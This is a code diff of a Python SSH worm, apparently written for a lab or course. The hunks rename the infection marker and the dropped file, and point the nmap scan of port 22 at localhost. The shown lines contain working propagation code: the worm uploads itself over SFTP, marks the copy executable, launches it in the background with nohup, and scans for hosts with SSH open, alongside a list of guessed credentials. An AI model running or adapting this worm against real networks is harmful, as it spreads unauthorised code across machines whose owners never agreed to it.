@@ -19,7 +19,7 @@ credList = [
 ]
 
 # The file marking whether the worm should spread
-INFECTED_MARKER_FILE = "/tmp/infected.txt"
+INFECTED_MARKER_FILE = "./infected.txt"
 
 ##################################################################
 # Returns whether the worm should spread
@@ -71,9 +71,9 @@ def spreadAndExecute(sshClient):
 		if sys.argv[1] == "--host":
 			wormLoc = "replicator_worm.py"
 	sftpClient = sshClient.open_sftp()
-	sftpClient.put(wormLoc, "/tmp/replicator_worm.py")
-	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
-	sshClient.exec_command("nohup python /tmp/replicator_worm.py &")
+	sftpClient.put(wormLoc, "/tmp/worm.py")
+	sshClient.exec_command("chmod a+x /tmp/worm.py")
+	sshClient.exec_command("nohup python /tmp/worm.py &")
 	
 
 
@@ -209,7 +209,7 @@ def getHostsOnTheSameNetwork():
 	# and return the list of discovered
 	# IP addresses.	
 	portScanner = nmap.PortScanner()
-	portScanner.scan('10.0.2.15', arguments='-p -22 --open')
+	portScanner.scan('127.0.0.1', arguments='-p -22 --open')
 	hostInfo = portScanner.all_hosts();
 	liveHosts = []
 	ip_add = getMyIP(b"eth0")
